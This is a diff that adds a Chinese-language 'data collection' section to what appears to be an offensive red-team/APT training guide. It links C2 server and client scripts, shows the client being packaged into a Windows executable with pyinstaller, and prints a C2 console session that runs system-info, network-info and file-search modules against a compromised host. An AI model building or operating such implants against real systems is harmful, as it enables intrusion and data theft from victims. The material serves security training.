@@ -211,3 +211,39 @@ instance of __PARAMETERS
         ReturnValue = 0;
 };
 ```
+
+### 数据收集
+
+[DC_server.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB/DC_server.py)
+
+[DC_client.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB/DC_client.py)
+
+```bash
+pyinstaller.exe --onefile .\DC_client.py
+```
+
+```bash
+C2> use system_info
+Module system_info loaded
+C2> exploit
+Exploit command sent to session 1
+C2> Raw message from session 1: {"result": "Ck5hbWUgICAg......"}
+Received from session 1:
+Name            Manufacturer Model     TotalPhysicalMemory
+----            ------------ -----     -------------------
+WIN-DBR3H49FQJ3 VMware, Inc. VMware7,1          2146439168
+
+C2> use network_info
+Module network_info loaded
+C2> exploit
+Exploit command sent to session 1
+C2> Raw message from session 1: {"result": "CgpJUEFkZHJlc3M......"
+
+C2> use file_search
+Module file_search loaded
+C2> exploit
+Exploit command sent to session 1
+C2> Raw message from session 1: {"result": ""}
+```
+
+## 常见C2工具
